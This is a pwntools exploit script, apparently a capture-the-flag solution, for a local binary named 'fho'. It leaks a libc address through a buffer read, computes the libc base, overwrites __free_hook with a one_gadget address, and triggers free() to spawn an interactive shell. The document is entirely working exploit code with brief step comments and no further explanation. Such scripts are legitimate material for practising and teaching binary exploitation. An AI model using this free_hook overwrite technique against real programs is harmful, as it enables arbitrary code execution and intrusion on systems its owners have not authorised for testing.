from pwn import *

p = process("./fho")
e = ELF("./fho")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")

def slog(name, addr): return success(": ".join([name, hex(addr)]))

# [1] leak libc base
buf = b"A"*0x48
p.sendafter("Buf: ", buf)
p.recvuntil(buf)

libc_start_main_xx = p.recvline()[:-1]+b"\x00"*2
libc_start_main_xx = u64(libc_start_main_xx)
libc_base = libc_start_main_xx - (libc.symbols["__libc_start_main"] + 0xf3)
free_hook = libc_base + libc.symbols["__free_hook"]
og = libc_base + 0xe3b31
slog("libc_base", libc_base)
slog("free_hook", free_hook)

# [2] overwrite 'free_hook' with 'one_gadget'
p.recvuntil("To write: ")
p.sendline(str(free_hook))
p.recvuntil("With: ")
p.sendline(str(og))

# [3] exploit
p.recvuntil("To free: ")
p.sendline(str(0x33333)) #doesn't matter

p.interactive()